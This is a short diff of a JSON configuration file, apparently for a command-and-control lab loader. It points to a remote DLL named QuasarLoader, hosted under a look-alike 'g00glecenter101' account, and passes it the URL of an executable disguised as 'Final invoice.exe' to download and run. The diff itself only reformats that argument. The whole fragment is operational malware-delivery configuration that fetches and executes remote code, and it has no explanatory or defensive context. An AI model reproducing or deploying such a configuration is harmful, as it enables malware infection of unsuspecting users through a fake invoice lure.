@@ -6,7 +6,7 @@
       "url": "https://raw.githubusercontent.com/g00glecenter101-arch/lab-c2/refs/heads/main/QuasarLoader.dll",
       "class": "QuasarLoader",
       "method": "Load",
-      "args": ["https://raw.githubusercontent.com/g00glecenter101-arch/lab-c2/refs/heads/main/Final%20invoice.exe"]
+      "args": "https://raw.githubusercontent.com/g00glecenter101-arch/lab-c2/refs/heads/main/Final%20invoice.exe"
     }
   ]
 }
